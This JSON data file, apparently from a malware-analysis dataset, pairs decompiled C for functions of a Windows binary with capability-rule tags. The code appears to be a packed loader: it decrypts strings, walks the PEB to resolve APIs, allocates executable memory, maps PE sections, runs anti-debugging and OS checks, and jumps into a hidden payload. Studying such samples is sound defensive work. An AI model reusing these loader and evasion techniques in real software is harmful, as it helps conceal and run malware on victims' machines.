{
    "00401039": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401039(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    if (arg_14h == 0) {\n        iVar1 = *(arg_18h + 0x3c);\n        var_34h = 0;\n        if (iVar1 != 0) {\n            do {\n                *(arg_8h + var_34h) = *(arg_ch + var_34h);\n                var_34h = var_34h + 1;\n            } while (var_34h != iVar1);\n        }\n    }\n    iVar1 = *(arg_10h + 0x10);\n    iVar2 = *(arg_10h + 0xc);\n    iVar3 = *(arg_10h + 0x14);\n    var_30h = 0;\n    if (iVar1 != 0) {\n        do {\n            *(arg_8h + iVar2 + var_30h) = *(arg_ch + iVar3 + var_30h);\n            var_30h = var_30h + 1;\n        } while (var_30h != iVar1);\n    }\n    return;\n}\n",
        "token_count": 380
    },
    "004010f3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004010f3(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_8h_00;\n    code *pcVar1;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint32_t var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    \n    var_10h = 0x4f017f4f;\n    var_18h = 0x22d8cdff;\n    fcn.00401baf(&var_38h, 0x404211, 0xe);\n    arg_8h_00 = fcn.00401a13();\n    pcVar1 = fcn.0040314e(arg_8h_00, &var_38h);\n    var_14h = 0;\n    if (0xff < pcVar1) {\n        do {\n        } while (var_10h + 0xfe1441d3U <= var_18h);\n        var_14h = (*pcVar1)(0, arg_ch, 0x1000, arg_8h);\n    }\n    return var_14h;\n}\n",
        "token_count": 278
    },
    "0040142f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0040142f(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint var_14h;\n    uint var_ch;\n    \n    if (arg_ch != 0) {\n        *0x405284 = arg_8h;\n        return arg_8h != 0;\n    }\n    *0x405274 = arg_8h;\n    return arg_8h != 0;\n}\n",
        "token_count": 96
    },
    "0040155c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040155c(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *0x405274 = 0;\n    *0x405284 = 0;\n    if (arg_8h != 0) {\n        if (arg_8h == 1) {\n            *0x405274 = 1;\n        }\n        else {\n            *0x405274 = arg_8h;\n        }\n    }\n    if (arg_ch != 0) {\n        *0x405284 = arg_ch + 4;\n    }\n    return;\n}\n",
        "token_count": 157
    },
    "0040172a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint fcn.0040172a(void)\n\n{\n    uint uVar1;\n    uchar auStack92 [4];\n    uchar auStack88 [64];\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint var_4h;\n    \n    uStack16 = 0x6a2a928e;\n    uStack24 = 0x401;\n    uStack20 = 0x6b;\n    (*_sym.imp.USER32.dll_ChildWindowFromPoint)(0xbcf2f8);\n    (*_sym.imp.USER32.dll_GetLastInputInfo)(auStack92);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetSystemDefaultLCID)();\n    (*_sym.imp.KERNEL32.dll_GetProcessIoCounters)(0xb300, auStack88);\n    return uVar1;\n}\n",
        "token_count": 199
    },
    "null": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_94h\n// WARNING: Variable defined which should be unmapped: var_98h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: arg_ch\n\nuint __cdecl entry0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBX;\n    uint32_t uVar2;\n    int32_t unaff_EBP;\n    uint unaff_ESI;\n    uint in_stack_00000010;\n    uint in_stack_00000014;\n    uint in_stack_00000018;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uchar auStack96 [40];\n    uint var_34h;\n    uint var_30h;\n    uint32_t uStack44;\n    uchar auStack40 [16];\n    uint var_14h;\n    uint var_10h;\n    uint uVar3;\n    uint var_4h;\n    \n    fcn.0040155c(unaff_ESI, &stack0xfffffffc);\n    if (unaff_EBX == 0x10) {\n        *(unaff_EBP + -4) = 0;\n    }\n    uStack44 = 0x595ad439;\n    (*_sym.imp.KERNEL32.dll_GetCommandLineA)();\n    fcn.0040172a();\n    *0x40527c = in_stack_00000010;\n    *0x405280 = in_stack_00000018;\n    *0x405278 = in_stack_00000014;\n    uVar2 = uStack44 & 0x7dbd08b;\n    fcn.004015ce();\n    fcn.0040172a();\n    if (uVar2 != 0x3b375039) {\n        iVar1 = fcn.00402c2e(_sym.imp.KERNEL32.dll_AllocConsole);\n        uVar3 = 0;\n        if (iVar1 != 0) goto code_r0x004018cc;\n    }\n    fcn.00402861();\n    (*_sym.imp.USER32.dll_TranslateMessage)(auStack40);\n    (*_sym.imp.ole32.dll_CoRevokeMallocSpy)();\n    (*_sym.imp.USER32.dll_GetComboBoxInfo)(0x6e0cae, auStack96);\n    uVar3 = 1;\ncode_r0x004018cc:\n    fcn.004012c5();\n    fcn.0040133a();\n    return uVar3;\n}\n",
        "token_count": 657
    },
    "00401a13": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_eh\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00401a13(void)\n\n{\n    int32_t iVar1;\n    uint var_9ch;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint *var_88h;\n    uint *var_84h;\n    int32_t var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_6dh;\n    uint var_5ch;\n    int32_t var_14h;\n    uint var_eh;\n    \n    var_84h = &var_6dh;\n    var_eh._0_2_ = 0x4f49;\n    var_14h = 0x38e043f5;\n    fcn.00401baf(var_84h, 0x4041eb, 0xe);\n    var_80h = 0;\n    var_88h = &var_5ch;\n    do {\n        if (*var_84h == '\\0') {\n            *var_88h = var_eh ^ 0x4f49;\n            break;\n        }\n        iVar1 = var_14h + -0x38e043e4;\n        *var_88h = *var_84h;\n        var_80h = var_80h + 1;\n        var_84h = var_84h + 1;\n        var_88h = var_88h + 2;\n    } while (var_80h != iVar1);\n    fcn.00402408(&var_5ch, 0);\n    return;\n}\n",
        "token_count": 380
    },
    "00401baf": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401baf(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_20h = 0;\n    if (arg_10h != 0) {\n        do {\n            uVar1 = var_20h & 7;\n            if (var_20h < 8) {\n                uVar1 = var_20h;\n            }\n            if (arg_10h < uVar1 || 8 < uVar1) {\n                return;\n            }\n            *(arg_8h + var_20h) = *(arg_ch + var_20h) - *(uVar1 + 0x404285);\n            var_20h = var_20h + 1;\n        } while (var_20h < arg_10h);\n    }\n    return;\n}\n",
        "token_count": 248
    },
    "00401c36": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401c36(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    \n    if (arg_10h * arg_10h + arg_10h * arg_10h * -2 + arg_10h * arg_10h != 0) {\n        fcn.00401000(0x63d3);\n        return 0;\n    }\n    var_14h = 0;\n    if (arg_10h != 0) {\n        do {\n            *(arg_8h + var_14h) = *(arg_ch + var_14h);\n            var_14h = var_14h + 1;\n        } while (var_14h != arg_10h);\n    }\n    return arg_8h;\n}\n",
        "token_count": 226
    },
    "00401ce0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_5h\n\nint32_t __cdecl fcn.00401ce0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_5h;\n    \n    var_10h = 0;\n    iVar1 = var_10h;\n    do {\n        var_10h = iVar1;\n        iVar1 = var_10h + 1;\n    } while (*(arg_8h + var_10h) != '\\0');\n    return var_10h;\n}\n",
        "token_count": 142
    },
    "00401d1c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nbool fcn.00401d1c(void)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t in_FS_OFFSET;\n    bool bVar3;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0x6e758abf;\n    var_8h = 0;\n    iVar1 = fcn.00402687();\n    bVar3 = false;\n    if (iVar1 != 0) {\n        iVar1 = fcn.00402408(0, iVar1);\n        pcVar2 = fcn.00403107();\n        bVar3 = false;\n        if (pcVar2 != NULL) {\n            bVar3 = false;\n            if (**(iVar1 + 0x28) != 0) {\n                (*pcVar2)(*(iVar1 + 0x28), &var_8h);\n                iVar1 = *(in_FS_OFFSET + 0x18);\n                if (iVar1 == 0) {\n                    iVar1 = -1;\n                }\n                bVar3 = *(iVar1 + 0x34) != 0xc1;\n            }\n        }\n    }\n    return bVar3;\n}\n",
        "token_count": 318
    },
    "00401dd6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401dd6(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint32_t var_24h;\n    uint32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_20h = 0;\n    var_24h = 4;\n    do {\n        for (uVar1 = *(var_20h + 0x404252); uVar1 < arg_10h; uVar1 = uVar1 + 0x33) {\n            uVar3 = var_24h + uVar1;\n            uVar2 = uVar1 & 3;\n            if (2 < var_24h) {\n                uVar2 = uVar1 % 0x32;\n            }\n            *(arg_8h + uVar1) = *(arg_ch + uVar1) - *(uVar2 + 0x40421f);\n            var_24h = uVar3;\n        }\n        var_20h = var_20h + 1;\n    } while (var_24h != 0 && var_20h < 0x33);\n    return;\n}\n",
        "token_count": 355
    },
    "00401ed3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Removing unreachable block (ram,0x00401f66)\n\nint16_t * __cdecl fcn.00401ed3(int32_t arg_8h)\n\n{\n    code *pcStack52;\n    int16_t *piStack48;\n    uint var_8h;\n    \n    pcStack52 = fcn.00403257;\n    if (arg_8h == 0) {\n        for (; ((piStack48 = pcStack52,  *pcStack52 != 0x5a4d || (*(pcStack52 + *(pcStack52 + 0x3c)) != 'P')) ||\n               ((pcStack52 + *(pcStack52 + 0x3c))[1] != 'E')); pcStack52 = pcStack52 + -0x1000 & 0xfffff000) {\n        }\n    }\n    else {\n        piStack48 = fcn.00402408(arg_8h, 0);\n    }\n    return piStack48;\n}\n",
        "token_count": 229
    },
    "00402214": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_dh\n\nint32_t __cdecl fcn.00402214(int32_t arg_8h)\n\n{\n    char cVar1;\n    char cVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_4ch;\n    uint32_t var_48h;\n    uint var_44h;\n    uint16_t *var_40h;\n    uint32_t var_3ch;\n    uint var_38h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_dh;\n    \n    iVar4 = fcn.00402687();\n    iVar5 = 0;\n    if (*(iVar4 + 1 + *(iVar4 + 0x3c)) == 'E') {\n        iVar5 = iVar4 + *(iVar4 + 0x3c);\n    }\n    iVar5 = *(iVar5 + 0x78);\n    uVar3 = *(iVar4 + 0x18 + iVar5);\n    if (uVar3 != 0) {\n        var_40h = iVar4 + *(iVar4 + iVar5 + 0x24);\n        var_3ch = 0;\n        do {\n            var_48h = 0;\n            do {\n                cVar1 = *(arg_8h + var_48h);\n                cVar2 = *(iVar4 + *(iVar4 + *(iVar4 + 0x20 + iVar5) + var_3ch * 4) + var_48h);\n                if (cVar2 == '\\0') break;\n                var_48h = var_48h + 1;\n            } while ((cVar2 == cVar1 && cVar1 != '\\0') && var_48h < 0x20);\n            if (cVar2 == cVar1) {\n                return iVar4 + *(iVar4 + *(iVar4 + iVar5 + 0x1c) + *var_40h * 4);\n            }\n            var_3ch = var_3ch + 1;\n            var_40h = var_40h + 1;\n        } while (var_3ch < uVar3);\n    }\n    return 0;\n}\n",
        "token_count": 536
    },
    "00402354": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402354(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t arg_8h_00;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    arg_8h_00 = fcn.004010f3(0x40, 0x19000);\n    var_1ch = 0;\n    if (arg_8h_00 != 0) {\n        fcn.00402ab1(arg_8h_00, arg_ch);\n        *(arg_8h + 0x54) = arg_8h_00;\n        *(arg_8h + 0x58) = arg_8h_00 + -0x400000;\n        var_1ch = arg_8h_00 + 0x2b00;\n    }\n    return var_1ch;\n}\n",
        "token_count": 222
    },
    "00402408": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_eh\n\nint32_t * __cdecl fcn.00402408(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    int16_t iVar2;\n    int32_t *piVar3;\n    int16_t iVar4;\n    int32_t in_FS_OFFSET;\n    bool bVar5;\n    uint var_54h;\n    int32_t *var_4dh;\n    uint var_48h;\n    uint var_44h;\n    uint var_3bh;\n    uint var_34h;\n    uint var_30h;\n    uint32_t var_2ch;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_eh;\n    \n    iVar1 = *(in_FS_OFFSET + 0x18);\n    if (iVar1 == 0) {\n        iVar1 = -1;\n    }\n    iVar1 = *(*(iVar1 + 0x30) + 0xc);\n    piVar3 = iVar1 + 0x14;\n    unique0x00007a00 = *(iVar1 + 0x14);\n    if (unique0x00007a00 != piVar3) {\n        do {\n            if (arg_ch != NULL && stack0xffffffb0[4] == arg_ch) {\n                return stack0xffffffb0 + -2;\n            }\n            if (arg_8h != 0) {\n                var_2ch = 0;\n                if (*(stack0xffffffb0 + 9) >> 1 != 0) {\n                    do {\n                        iVar4 = *(arg_8h + var_2ch * 2);\n                        iVar2 = *(stack0xffffffb0[10] + var_2ch * 2);\n                        if (iVar4 - 0x61U < 0x1a) {\n                            iVar4 = iVar4 + -0x20;\n                        }\n                        if (iVar2 - 0x61U < 0x1a) {\n                            iVar2 = iVar2 + -0x20;\n                        }\n                        if (iVar2 == 0) {\n                            bVar5 = iVar4 == 0;\n                            break;\n                        }\n                        var_2ch = var_2ch + 1;\n                        bVar5 = iVar2 == iVar4;\n                    } while (bVar5 && var_2ch < *(stack0xffffffb0 + 9) >> 1);\n                    if (bVar5) {\n                        return stack0xffffffb0[4];\n                    }\n                }\n            }\n            unique0x00007a00 = *stack0xffffffb0;\n        } while (unique0x00007a00 != piVar3);\n    }\n    return NULL;\n}\n",
        "token_count": 618
    },
    "004027a8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.004027a8(void)\n\n{\n    int32_t iVar1;\n    int32_t in_FS_OFFSET;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = *(in_FS_OFFSET + 0x18);\n    if (iVar1 == 0) {\n        iVar1 = -1;\n    }\n    return *(iVar1 + 0x34);\n}\n",
        "token_count": 87
    },
    "004027d9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nbool fcn.004027d9(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    bool bVar4;\n    int32_t iVar3;\n    int32_t in_FS_OFFSET;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    iVar2 = fcn.00402687();\n    iVar3 = 0;\n    if (*(iVar2 + 1 + *(iVar2 + 0x3c)) == 'E') {\n        iVar3 = iVar2 + *(iVar2 + 0x3c);\n    }\n    iVar2 = *(in_FS_OFFSET + 0x18);\n    if (iVar2 == 0) {\n        iVar2 = -1;\n    }\n    uVar1 = *(*(iVar2 + 0x30) + 0xa4);\n    bVar4 = true;\n    if (uVar1 != 5) {\n        bVar4 = 0x549352b9 < *(iVar3 + 8) && uVar1 < 6;\n    }\n    return bVar4;\n}\n",
        "token_count": 245
    },
    "00402861": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Removing unreachable block (ram,0x00402956)\n// WARNING: Removing unreachable block (ram,0x0040296a)\n\nuint32_t fcn.00402861(void)\n\n{\n    code *pcVar1;\n    char *pcVar2;\n    char *pcVar3;\n    code *pcStack212;\n    uint32_t uStack196;\n    uint auStack180 [2];\n    uint uStack172;\n    int16_t *piStack164;\n    uchar auStack160 [52];\n    uint uStack108;\n    uint uStack104;\n    int16_t *piStack84;\n    uint uStack80;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint32_t uStack40;\n    uint8_t uStack33;\n    uint uStack32;\n    uint uStack28;\n    uint var_bp_ch;\n    \n    uStack28 = 0;\n    uStack32 = 0x30d06119;\n    uStack33 = 0x9e;\n    uStack40 = 0x2f314f85;\n    fcn.00401ff3(auStack180);\n    uStack108 = auStack180[0];\n    uStack104 = 0x12a00;\n    uStack52 = *0x405274;\n    uStack48 = *0x405278;\n    uStack44 = *0x40527c;\n    uStack56 = *0x405280;\n    uStack60 = *0x405284;\n    for (pcStack212 = fcn.00403257;\n        ((piStack164 = pcStack212,  *pcStack212 != 0x5a4d ||\n         (pcVar3 = pcStack212 + *(pcStack212 + 0x3c),  *pcVar3 != uStack33 + 0xb2)) || (pcVar3[1] != (uStack33 ^ 0xdb)))\n        ; pcStack212 = pcStack212 + -0x1000 & uStack40 + 0xd0cea07b) {\n    }\n    piStack84 = pcStack212;\n    uStack196 = uStack40 ^ 0x2f314f85;\n    pcVar2 = NULL;\n    if (pcVar3[1] == 0x45) {\n        pcVar2 = pcVar3;\n    }\n    uStack80 = *(pcVar2 + 0x50);\n    pcVar1 = fcn.00402354(auStack160, uStack172);\n    if (pcVar1 != NULL) {\n        uStack196 = uStack40 + 0xd0ceb07c;\n        (*pcVar1)(auStack160);\n    }\n    return uStack196;\n}\n",
        "token_count": 621
    },
    "00402ab1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Removing unreachable block (ram,0x00402b8f)\n\nvoid __cdecl fcn.00402ab1(int32_t arg_8h, int32_t arg_ch)\n\n{\n    char *pcVar1;\n    uint32_t uStack64;\n    char *pcStack60;\n    uint var_ch;\n    \n    if (((arg_8h != 0 && arg_ch != 0) && (pcVar1 = arg_ch + *(arg_ch + 0x3c),  *pcVar1 == 'P')) &&\n       (pcVar1 != NULL && pcVar1[1] == 'E')) {\n        if (*(pcVar1 + 6) != 0) {\n            pcStack60 = pcVar1 + *(pcVar1 + 0x14) + 0x18;\n            uStack64 = 0;\n            do {\n                fcn.00401039(arg_8h, arg_ch, pcStack60, uStack64, pcVar1 + 0x18);\n                uStack64 = uStack64 + 1;\n                pcStack60 = pcStack60 + 0x28;\n            } while (uStack64 < *(pcVar1 + 6));\n        }\n    }\n    return;\n}\n",
        "token_count": 283
    },
    "00402c2e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00402c2e(uint arg_8h)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    uint var_4h;\n    \n    iVar1 = fcn.004025d5(arg_8h);\n    bVar2 = true;\n    if (iVar1 == 0) {\n        iVar1 = fcn.004027d9();\n        bVar2 = true;\n        if (iVar1 == 0) {\n            iVar1 = fcn.00401d1c();\n            bVar2 = iVar1 != 0;\n        }\n    }\n    return bVar2;\n}\n",
        "token_count": 137
    },
    "0040314e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_60h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040314e(uint arg_8h, int32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    code *pcVar2;\n    uint var_60h;\n    uint32_t var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    \n    var_8h = 0x722c6550;\n    var_48h = 0;\n    if (arg_ch != 0) {\n        fcn.00401baf(&var_34h, 0x4041f9, 0x18);\n        pcVar2 = fcn.00402214(&var_34h);\n        var_48h = 0;\n        if (pcVar2 != NULL) {\n            var_ch = arg_ch;\n            var_5ch = 0;\n            uVar1 = var_5ch;\n            do {\n                var_5ch = uVar1;\n                uVar1 = var_5ch + 1;\n            } while (*(arg_ch + var_5ch) != '\\0');\n            var_10h._0_2_ = var_5ch;\n            var_54h = 0;\n            if ((var_5ch & (var_8h ^ 0x722c9aaf)) != 0) {\n                var_38h = 0;\n                var_10h._2_2_ = var_10h;\n                (*pcVar2)(arg_8h, &var_10h, 0, &var_38h, &var_10h);\n                var_54h = var_38h;\n            }\n            var_48h = var_54h;\n        }\n    }\n    return var_48h;\n}\n",
        "token_count": 485
    },
    "004011ae": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004011ae(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint var_24h;\n    uint var_20h;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    uVar1 = arg_8h & 3;\n    if (2 < arg_ch) {\n        uVar1 = arg_8h % 0x32;\n    }\n    return uVar1;\n}\n",
        "token_count": 117
    },
    "004025d5": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nbool __cdecl fcn.004025d5(char *arg_8h)\n\n{\n    char cVar1;\n    uint var_14h;\n    bool var_dh;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    cVar1 = *arg_8h;\n    while( true ) {\n        if (cVar1 != -1) {\n            var_dh = false;\n            if ((cVar1 == -0x48) && (var_dh = false,  arg_8h[3] == 'P')) {\n                var_dh = arg_8h[4] == -0x33;\n            }\n            return var_dh;\n        }\n        if (arg_8h[1] != '%') break;\n        arg_8h = **(arg_8h + 2);\n        cVar1 = *arg_8h;\n    }\n    return false;\n}\n",
        "token_count": 219
    },
    "004015ce": {
        "rules": [
